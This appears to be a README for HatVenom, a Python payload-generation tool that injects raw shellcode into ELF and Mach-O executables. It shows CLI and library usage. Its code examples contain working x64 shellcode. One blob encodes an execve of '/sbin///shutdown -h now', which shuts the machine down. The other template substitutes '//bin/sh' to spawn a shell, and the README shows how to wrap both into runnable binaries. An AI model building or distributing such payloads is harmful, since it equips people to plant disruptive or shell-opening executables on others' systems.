# HatVenom

Powerful payload generation and shellcode injection tool that provides support for common platforms and architectures.

## CLI examples

```bash
python3 hatvenom.py --format elf --arch x64 --shellcode '\x00'

# With replacing offsets

python3 hatvenom.py --format elf --arch x64 --shellcode '\x00:string:\x00' --offsets string=alena
```

## Python example

```python
from hatvenom import HatVenom

shellcode = (
    b"\x48\x31\xc0\x48\x31\xd2\x50\x6a"
    b"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
    b"\x50\x66\x68\x2d\x68\x48\x89\xe1"
    b"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
    b"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
    b"\x74\x64\x6f\x77\x6e\x41\x52\x41"
    b"\x50\x48\x89\xe7\x52\x53\x51\x57"
    b"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
    b"\x05"
)

hatvenom = HatVenom()
hatvenom.generate_to('elf', 'x64', shellcode)
```

## Replacing offsets

HatVenom allows you to replace offsets in your shellcode, that means that you can create executable files with injected value.

```python
from hatvenom import HatVenom

shellcode = (
    b"\x48\x31\xf6\x56\x48\xbf"
    b":string:"
    b"\x57\x48\x89\xe7\x48\x31"
    b"\xd2\x48\x31\xc0\xb0\x02"
    b"\x48\xc1\xc8\x28\xb0\x3b"
    b"\x0f\x05"
)

hatvenom = HatVenom()
hatvenom.generate_to('macho', 'x64', shellcode, {'string':'//bin/sh'})
```

Offsets must be this type `:offset:` or if you want to specify offset type - `:offset:ipv4:`.
